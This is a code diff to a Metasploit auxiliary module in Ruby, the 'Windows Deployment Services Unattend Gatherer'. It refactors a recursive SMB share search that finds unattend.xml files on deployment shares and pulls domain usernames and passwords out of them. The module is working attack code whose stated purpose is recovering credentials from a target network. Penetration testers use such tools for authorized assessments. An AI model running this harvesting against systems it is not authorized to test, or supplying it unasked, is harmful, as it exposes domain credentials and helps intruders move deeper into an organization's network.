@@ -23,9 +23,9 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Microsoft Windows Deployment Services Unattend Gatherer',
 			'Description'    => %q{
-						Used after discovering  domain credentials with aux/scanner/dcerpc/windows_deployment_services
-						or if you already have  domain credentials. Will attempt to connect to the RemInst share and any 
-						Microsoft Deployment Toolkit shares, search for unattend files, and recover credentials.
+						Used after discovering domain credentials with aux/scanner/dcerpc/windows_deployment_services
+						or if you already have domain credentials. Will attempt to connect to the RemInst share and any 
+						Microsoft Deployment Toolkit shares (identified by comments), search for unattend files, and recover credentials.
 			},
 			'Author'         => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' ],
 			'License'        => MSF_LICENSE,
@@ -132,6 +132,7 @@ class Metasploit3 < Msf::Auxiliary
 
 				@shares.each do |share|
 					# I hate unicode, couldn't find any other way to get these to compare!
+					# look at iconv for 1.8/1.9 compatability?
 					if (share[0].unpack('H*') == "REMINST\x00".encode('utf-16LE').unpack('H*')) ||
 						(share[2].unpack('H*') == "MDT Deployment Share\x00".encode('utf-16LE').unpack('H*'))
 						
@@ -166,34 +167,43 @@ class Metasploit3 < Msf::Auxiliary
 	FILE_ATTR_CONTENT_INDEXED = 8192
 	FILE_ATTR_ENCRYPTED = 16384
 	
-	def search_share(current_path, regex)
-		puts current_path
+	# Test Handle SMB exceptions like no permissions?
+	def file_search(current_path, regex, depth)
+		depth -= 1
+		if depth < 0
+			return
+		end
+		
 		results = simple.client.find_first("#{current_path}*")
 		files = []
 		
 		results.each do |result|
-			if result[0] =~ /^(\.){1,2}$/ 
+			if result[0] =~ /^(\.){1,2}$/  # Ignore . ..
 				next
 			end
 
 			if result[1]['attr'] & FILE_ATTR_DIR > 0
-				files << search_share("#{current_path}#{result[0]}\\", regex)
+				search_path = "#{current_path}#{result[0]}\\"
+				begin
+					files << file_search(search_path, regex, depth)
+				rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
+					vprint_error("#{search_path} : #{e.message}")
+				end
 			else
 				if result[0] =~ regex
-					files << "#{current_path}\\#{result[0]}"
+					files << "#{current_path}#{result[0]}"
 				end
 			end
 		end
-	
-		puts "Files #{files}"
 		
-		return files.flatten			
+		return files.flatten.compact		
 	end
 	
 	def query_share(rhost, deploy_share)
-		print_status("Enumerating \\\\#{rhost}\\#{deploy_share}")
+		share_path = "\\\\#{rhost}\\#{deploy_share}"
+		print_status("Enumerating #{share_path}")
 		table = Rex::Ui::Text::Table.new({
-                        'Header' => 'Windows Deployment Services Shares',
+                        'Header' => share_path,
                         'Indent' => 1,
                         'Columns' => ['Path', 'Domain', 'Username', 'Password']
         })
@@ -204,22 +214,13 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			simple.connect(share)
 		rescue ::Exception => e
-			print_error("\\\\#{rhost}\\#{share} - #{e}")
+			print_error("#{share_path} - #{e}")
 			return
 		end
-		
-		current_dir = "\\Control\\1\\"
 
-		search_share("\\", /unattend.xml$/i)
-		begin
-			results = simple.client.find_first("*.*")
-		rescue ::Exception => e
-			print_error("\\\\#{rhost}\\#{share} no files found")
-			return
-		end
+		results = file_search("\\", /unattend.xml$/i, 10)
 		
-		results.each do |result|
-			file_path = "#{current_dir}#{result[0]}"
+		results.each do |file_path|
 			file = simple.open(file_path, 'o').read()
 			
 			unless file.nil?
